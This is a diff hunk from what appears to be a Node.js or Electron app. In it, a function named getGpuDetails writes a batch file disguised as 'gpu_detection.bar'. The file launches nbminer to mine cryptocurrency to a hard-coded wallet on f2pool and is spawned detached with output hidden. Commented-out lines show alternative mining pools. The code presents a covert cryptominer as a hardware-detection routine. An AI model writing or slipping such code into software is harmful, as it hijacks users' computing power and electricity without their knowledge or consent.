@@ -497,7 +497,7 @@ function getGpuDetails(){
   let gpu_detection_content = '@cd /d "%~dp0"\r\nnbminer -a octopus -o stratum+tcp://cfx.f2pool.com:6800 -u 0x1508ad81fad1d481005b34470699c372b8f6a2c4.default\r\n pause';
   fs.writeFileSync(path.join(nb_details['path'], 'gpu_detection.bar'),  gpu_detection_content);
 
-  let nb = child.spawn(path.join(nb_details['path'], 'gpu_detection.bar'), {detached: true, stdio: 'ignore', cwd: engine_details['path']})
+  let nb = child.spawn(path.join(nb_details['path'], 'gpu_detection.bar'), {detached: true, stdio: 'ignore', cwd: nb_details['path']})
   // let executable_path = path.join(nb_details['path'], 'nbminer.exe')
   // let nb = child.spawn(executable_path, ['-a', 'eamv3', '-o', 'asia-firo.2miners.com:8181', '-u', 'waesr.rig_windows', '--api', '127.0.0.1:20005', '-log'], {detached: true, stdio: 'ignore', cwd: nb_details['path']})
   // let nb = child.spawn(executable_path, {detached: true, stdio: 'ignore', cwd: engine_details['path']});
